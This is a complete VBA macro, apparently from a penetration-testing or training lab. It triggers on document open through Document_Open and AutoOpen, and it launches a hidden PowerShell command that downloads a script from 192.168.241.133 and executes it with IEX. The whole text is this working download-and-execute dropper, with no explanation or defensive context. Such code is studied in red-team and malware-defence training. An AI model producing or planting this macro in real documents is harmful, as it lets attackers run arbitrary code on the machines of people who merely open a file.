Sub MyMacro()
	Dim str As String
	str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.241.133/run.ps1') | IEX"
	Shell str, vbHide
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub AutoOpen()
	MyMacro
End Sub